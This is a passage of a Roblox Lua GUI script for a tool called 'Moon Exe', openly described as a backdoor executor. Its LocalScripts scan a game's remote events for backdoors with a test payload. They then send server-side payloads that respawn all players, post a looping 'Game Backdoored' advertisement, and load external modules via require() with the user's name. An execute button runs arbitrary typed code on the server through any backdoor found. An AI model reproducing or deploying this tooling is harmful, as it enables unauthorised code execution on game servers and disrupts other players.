G2L["74"]["Position"] = UDim2.new(0.48071, 0, 0.6917, 0);
G2L["74"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["74"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.UIStroke
G2L["75"] = Instance.new("UIStroke", G2L["74"]);
G2L["75"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["75"]["Thickness"] = 1.3;
G2L["75"]["Color"] = Color3.fromRGB(233, 118, 36);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel
G2L["76"] = Instance.new("ImageLabel", G2L["74"]);
G2L["76"]["BorderSizePixel"] = 0;
G2L["76"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["76"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["76"]["Image"] = [[rbxassetid://116070945479545]];
G2L["76"]["Size"] = UDim2.new(0, 174, 0, 141);
G2L["76"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["76"]["BackgroundTransparency"] = 1;
G2L["76"]["Position"] = UDim2.new(0.0067, 0, -0.00237, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["77"] = Instance.new("UIGradient", G2L["76"]);
G2L["77"]["Rotation"] = 90;
G2L["77"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton
G2L["78"] = Instance.new("TextButton", G2L["74"]);
G2L["78"]["BorderSizePixel"] = 0;
G2L["78"]["TextSize"] = 22;
G2L["78"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["78"]["BackgroundColor3"] = Color3.fromRGB(149, 72, 25);
G2L["78"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["78"]["Size"] = UDim2.new(0.11717, 121, 0.03039, 24);
G2L["78"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["78"]["Text"] = [[Soon!!!]];
G2L["78"]["Position"] = UDim2.new(0.09724, 0, 0.77059, 0);


-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextLabel
G2L["79"] = Instance.new("TextLabel", G2L["74"]);
G2L["79"]["BorderSizePixel"] = 0;
G2L["79"]["TextSize"] = 32;
G2L["79"]["TextTransparency"] = 0.49;
G2L["79"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["79"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["79"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["79"]["BackgroundTransparency"] = 1;
G2L["79"]["Size"] = UDim2.new(0, 129, 0, 21);
G2L["79"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["79"]["Text"] = [[More Coming]];
G2L["79"]["Position"] = UDim2.new(0.12699, 0, 0.06255, 0);


-- StarterGui.ScreenGui.Main.Hub.UIListLayout
G2L["7a"] = Instance.new("UIListLayout", G2L["2a"]);
G2L["7a"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["7a"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["7a"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.ScreenGui.Main.LocalScript
G2L["7b"] = Instance.new("LocalScript", G2L["c"]);



-- StarterGui.ScreenGui.Main.R6
G2L["7c"] = Instance.new("TextButton", G2L["c"]);
G2L["7c"]["BorderSizePixel"] = 0;
G2L["7c"]["TextSize"] = 20;
G2L["7c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7c"]["BackgroundColor3"] = Color3.fromRGB(50, 50, 50);
G2L["7c"]["FontFace"] = Font.new([[rbxasset://fonts/families/JosefinSans.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["7c"]["ZIndex"] = 1000000000;
G2L["7c"]["Size"] = UDim2.new(-0.01895, 98, 0.01352, 22);
G2L["7c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7c"]["Text"] = [[R6]];
G2L["7c"]["Name"] = [[R6]];
G2L["7c"]["Position"] = UDim2.new(0.39879, 0, 0.03594, 0);


-- StarterGui.ScreenGui.Main.R6.LocalScript
G2L["7d"] = Instance.new("LocalScript", G2L["7c"]);



-- StarterGui.ScreenGui.Load.LocalScript
local function C_3()
	local script = G2L["3"];
	wait(5)

	for i = 0.4, 1, 0.01 do
		script.Parent.Logo.BackgroundTransparency = i
		script.Parent.bg.BackgroundTransparency =i 
	end

	wait(1)
	script.Parent.bg.Visible = false
	script.Parent.Parent.Main.Visible = true
end;
task.spawn(C_3);
-- StarterGui.ScreenGui.Load.bg.LocalScript
local function C_5()
	local script = G2L["5"];
	local UI_ELEMENT = script.Parent 
	local START_POSITION = UDim2.new(0.34, 0, 0.5, 0)
	local END_POSITION = UDim2.new(0.58, 0, 0.5, 0)
	local TWEEN_DURATION = 1.0
	local EASING_STYLE = Enum.EasingStyle.Sine 
	local EASING_DIRECTION = Enum.EasingDirection.InOut 

	local tweenInfo = TweenInfo.new(
		TWEEN_DURATION,
		EASING_STYLE,
		EASING_DIRECTION,
		-1,
		true, 
		0 
	)


	local tween = game:GetService("TweenService"):Create(UI_ELEMENT, tweenInfo, {Position = END_POSITION})

	tween:Play()

end;
task.spawn(C_5);
-- StarterGui.ScreenGui.Load.Logo.LocalScript
local function C_7()
	local script = G2L["7"];
	local IMAGE_LOGO = script.Parent


	local ROTATION_ANGLE_1 = -5 
	local ROTATION_ANGLE_2 = 9  


	local TWEEN_DURATION = 1.0 
	local EASING_STYLE = Enum.EasingStyle.Quad 
	local EASING_DIRECTION = Enum.EasingDirection.InOut 

	local tweenInfo1 = TweenInfo.new(
		TWEEN_DURATION,
		EASING_STYLE,
		EASING_DIRECTION,
		0, 
		false, 
		0 
	)

	local tweenInfo2 = TweenInfo.new(
		TWEEN_DURATION,
		EASING_STYLE,
		EASING_DIRECTION,
		0, 
		false, 
		0
	)


	local function startRotationLoop()
		while true do
			local tween1 = game:GetService("TweenService"):Create(
				IMAGE_LOGO,
				tweenInfo1,
				{Rotation = ROTATION_ANGLE_1}
			)
			tween1:Play()
			tween1.Completed:Wait()

			local tween2 = game:GetService("TweenService"):Create(
				IMAGE_LOGO,
				tweenInfo2,
				{Rotation = ROTATION_ANGLE_2}
			)
			tween2:Play()
			tween2.Completed:Wait() 
		end
	end


	startRotationLoop()
end;
task.spawn(C_7);
-- StarterGui.ScreenGui.Load.Logo.LocalScript
local function C_8()
	local script = G2L["8"];
	wait(5)

	for i = 0.4, 1, 0.01 do
		script.Parent.BackgroundTransparency = i
		wait(time)
	end

	script.Parent:TweenSize(UDim2.new(0, 73,0, 49))
	script.Parent:TweenPosition(UDim2.new(0.066, 0,0.892, 0))
end;
task.spawn(C_8);
-- StarterGui.ScreenGui.LocalScript
local function C_b()
	local script = G2L["b"];
	local ownerId = 8167967082

	local function NotifyOwnerJoined(player)
		game.StarterGui:SetCore("SendNotification", {
			Title = "Moon",
			Text = "Omg Moon Owner joined !!! " .. player.Name,
			Icon = "rbxassetid://7395824155",
			Duration = 10,
		})
	end

	game.Players.PlayerAdded:Connect(function(player)
		if player.UserId == ownerId then
			NotifyOwnerJoined(player)
		end
	end)

end;
task.spawn(C_b);
-- StarterGui.ScreenGui.Main.RE.LocalScript
local function C_e()
	local script = G2L["e"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}



		local player = game.Players.LocalPlayer
		local payloading = [[
		for _, lol in pairs(game.Players:GetPlayers()) do
			lol:LoadCharacter()
		end
		]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_e);
-- StarterGui.ScreenGui.Main.Extrot.LocalScript
local function C_12()
	local script = G2L["12"];
	local buttons = {
		Exe = script.Parent.btns.Execute;
		clear = script.Parent.btns.Clear;
		connect = script.Parent.btns.Inject;
	}

	local statustext = script.Parent.Parent.Stats
	local codeBar = script.Parent.ScrollingFrame.TextBox

	local statusIcons = {
		Offline = "🔴";
		Checking = "🟠";
		Allow = "🟢";
	}

	local function setStatus(key)
		if key == "O" then
			statustext.Text = statusIcons.Offline
		elseif key == "C" then
			statustext.Text = statusIcons.Checking
		elseif key == "B" then
			statustext.Text = statusIcons.Allow
		end
	end

	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0 

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end


		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}



		local RE = [[
		local m = Instance.new("Message", game.Workspace)
		m.Text = "Moon Backdoor On top !!"
		wait(4)
		m:Destroy()
		]]








		local Hint = [[
		local hint = Instance.new("Hint", game.Workspace)
		hint.Text = "Game Backdoored by Moon Exe !! gg/W5bNxXf85r --- fastest backdoor executor"
		
		while true do
			wait(5)
			hint:Destroy()
			wait(5)
			local hint = Instance.new("Hint", game.Workspace)
			hint.Text = "Game Backdoored by Moon Exe !! gg/W5bNxXf85r --- fastest backdoor executor"
		end
		]]




		pcall(function()
			if isFunction then
				task.spawn(function() 
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(RE) end)
					pcall(function() remote:InvokeServer(Hint) end) --- its hint dumbass
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(RE) end)
				pcall(function() remote:FireServer(Hint) end) --- its hint dumbass
			end
		end)

		return testId
	end

	local function simpleFindRemote()
		setStatus("C")
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0 
		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock() 
		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 1
			local checkInterval = 1 or 3
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end

	local exeConnection
	local function updateExeButton()
		if exeConnection then
			exeConnection:Disconnect()
			exeConnection = nil
		end
		if foundExploit then
			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
				local code = codeBar.Text
				if code and code ~= "" then
					if remoteEvent then
						print("ℹ️ Executing via RemoteEvent:", remoteEvent:GetFullName())
						pcall(function() remoteEvent:FireServer(code) end)
					elseif remoteFunction then
						print("ℹ️ Executing via RemoteFunction:", remoteFunction:GetFullName())
						pcall(function()
							remoteFunction:InvokeServer("moonTSS", code)
						end)
					end
					StarterGui:SetCore("SendNotification", {
						Title = "🌙 moon",
						Text = "Code executed through backdoor",
						Icon = "rbxassetid://73958241564252",
						Duration = 3,
					})
				else
					StarterGui:SetCore("SendNotification", {
						Title = "🌙 moon",
						Text = "No Code to Execute",
						Icon = "rbxassetid://73958241564252",
						Duration = 3,
					})
				end
			end)
		else
			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
				StarterGui:SetCore("SendNotification", {
					Title = "Moon",
					Text = "No Backdoor Found",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			end)
		end
	end

	buttons.connect.MouseButton1Click:Connect(function()
		setStatus("C")
		StarterGui:SetCore("SendNotification", {
			Title = "Moon",
			Text = "Checking for backdoors...",
			Icon = "rbxassetid://7395824155",
			Duration = 3,
		})
		task.spawn(function()
			local scanStart = os.clock() 
			simpleFindRemote()
			local scanEnd = os.clock()
			print(string.format("🌙 moon: Scan completed in %.2f ms", (scanEnd - scanStart) * 1000))

			if foundExploit then
				setStatus("B")
				local formattedTime = string.format("%.2f", timeToFindExploit)
				StarterGui:SetCore("SendNotification", {
					Title = "🌙 moon",
					Text = "Backdoor found in " .. formattedTime .. " seconds!",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			else
				setStatus("O")
				StarterGui:SetCore("SendNotification", {
					Title = "🌙 moon",
					Text = "No backdoor found",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			end
			updateExeButton()
		end)
	end)

	buttons.clear.MouseButton1Click:Connect(function()
		codeBar.Text = ""
	end)

	setStatus("O")
	updateExeButton()
end;
task.spawn(C_12);
-- StarterGui.ScreenGui.Main.Extrot.btns.LocalScript
local function C_18()
	local script = G2L["18"];
	local color = {
		orange = Color3.fromRGB(232, 117, 35);
		itself = Color3.fromRGB(49, 49, 49)
	}

	local frame = script.Parent

	for _, v in pairs(frame:GetChildren()) do
		if v:IsA("TextButton") then
			v.MouseEnter:Connect(function()
				v.BackgroundColor3 = color.orange
			end)

			v.MouseLeave:Connect(function()
				v.BackgroundColor3 = color.itself
			end)
		end
	end
end;
task.spawn(C_18);
-- StarterGui.ScreenGui.Main.btns.LocalScript
local function C_23()
	local script = G2L["23"];
	local buttons = {
		executor = script.Parent.Exe;
		Admin = script.Parent.Admin;
		hub = script.Parent.Hub;
	}

	local frames = {
		ex = script.Parent.Parent.Extrot;
		ad = script.Parent.Parent.Admin;
		hu = script.Parent.Parent.Hub
	}


	buttons.executor.MouseButton1Click:Connect(function()
		frames.ex.Visible = true
		frames.ad.Visible = false
		frames.hu.Visible = false
	end)

	buttons.Admin.MouseButton1Click:Connect(function()
		frames.ex.Visible = false
		frames.ad.Visible = true
		frames.hu.Visible = false
	end)

	buttons.hub.MouseButton1Click:Connect(function()
		frames.ex.Visible = false
		frames.ad.Visible = false
		frames.hu.Visible = true
	end)
end;
task.spawn(C_23);
-- StarterGui.ScreenGui.Main.btns.LocalScript
local function C_26()
	local script = G2L["26"];
	local color = {
		orange = Color3.fromRGB(232, 117, 35);
		itself = Color3.fromRGB(49, 49, 49)
	}

	local frame = script.Parent

	for _, v in pairs(frame:GetChildren()) do
		if v:IsA("TextButton") then
			v.MouseEnter:Connect(function()
				v.BackgroundColor3 = color.orange
			end)

			v.MouseLeave:Connect(function()
				v.BackgroundColor3 = color.itself
			end)
		end
	end
end;
task.spawn(C_26);
-- StarterGui.ScreenGui.Main.UIDrag
local function C_27()
	local script = G2L["27"];
	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --

	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil

	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_27);
-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_33()
	local script = G2L["33"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(4513235536).G(']] .. player.Name .. [[')]]

		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end

	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else
		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_33);
-- StarterGui.ScreenGui.Main.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_3a()
	local script = G2L["3a"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(7634392335)(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
